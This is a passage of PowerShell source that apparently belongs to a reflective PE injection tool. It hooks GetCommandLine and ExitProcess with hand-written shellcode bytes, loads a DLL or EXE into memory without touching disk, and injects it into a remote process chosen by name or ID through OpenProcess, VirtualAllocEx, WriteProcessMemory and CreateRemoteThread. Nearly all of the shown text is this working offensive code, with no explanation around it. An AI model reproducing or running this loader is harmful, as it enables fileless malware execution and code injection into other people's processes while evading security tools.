		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		
		
		
		
		
		$DllList = @(""msvcr70d.dll"", ""msvcr71d.dll"", ""msvcr80d.dll"", ""msvcr90d.dll"", ""msvcr100d.dll"", ""msvcr110d.dll"", ""msvcr70.dll"" `
			, ""msvcr71.dll"", ""msvcr80.dll"", ""msvcr90.dll"", ""msvcr100.dll"", ""msvcr110.dll"")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_wcmdln"")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_acmdln"")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					""Error, couldn't find _wcmdln or _acmdln""
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		
		
		
		
		

		$ReturnArray = @()
		$ExitFunctions = @() 
		
		
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(""mscoree.dll"")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw ""mscoree handle null""
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, ""CorExitProcess"")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""CorExitProcess address not found""
		}
		$ExitFunctions += $CorExitProcessAddr
		
		
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitProcess"")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""ExitProcess address not found""
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			
			
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitThread"")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw ""ExitThread address not found""
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			
			
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		

		Write-Output $ReturnArray
	}
	
	
	
	
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	
	
	
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				
				
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		
		Write-Verbose ""Getting basic PE information from the file""
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning ""PE is not compatible with DEP, might cause issues"" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""IsWow64Process"")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit""
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw ""Call to IsWow64Process failed""
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw ""PowerShell must be same architecture (x86/x64) as PE being loaded and remote process""
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw ""PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)""
		}
		

		
		Write-Verbose ""Allocating memory for the PE and write its headers to memory""
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning ""PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again"" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				
		$EffectivePEHandle = [IntPtr]::Zero		
		if ($RemoteLoading -eq $true)
		{
			
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use""
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw ""VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).""
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		
		Write-Verbose ""Getting detailed PE information from the headers loaded in memory""
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose ""StartAddress: $PEHandle    EndAddress: $PEEndAddress""
		
		
		
		Write-Verbose ""Copy PE sections in to memory""
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		
		Write-Verbose ""Update memory addresses based on where the PE was actually loaded in memory""
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		
		Write-Verbose ""Import DLL's needed by the PE we are loading""
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose ""Update memory protection flags""
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
			}
		}
		else
		{
			Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
		}
		
		
		
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
		}
		
		
		
		if ($PEInfo.FileType -ieq ""DLL"")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw ""Unable to allocate memory in the remote process for shellcode""
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw ""Unable to write shellcode to remote process memory.""
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq ""EXE"")
		{
			
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			
			
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose ""Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in.""

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose ""EXE thread has completed.""
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done unloading the libraries needed by the PE""
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		
		Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
		{
			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
		}
		elseif ($ProcName -ne $null -and $ProcName -ne """")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw ""Can't find process $ProcName""
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		
		





		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't obtain the handle for process ID: $ProcId""
			}
			
			Write-Verbose ""Got the handle for the remote process to inject in to""
		}
		

		
		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
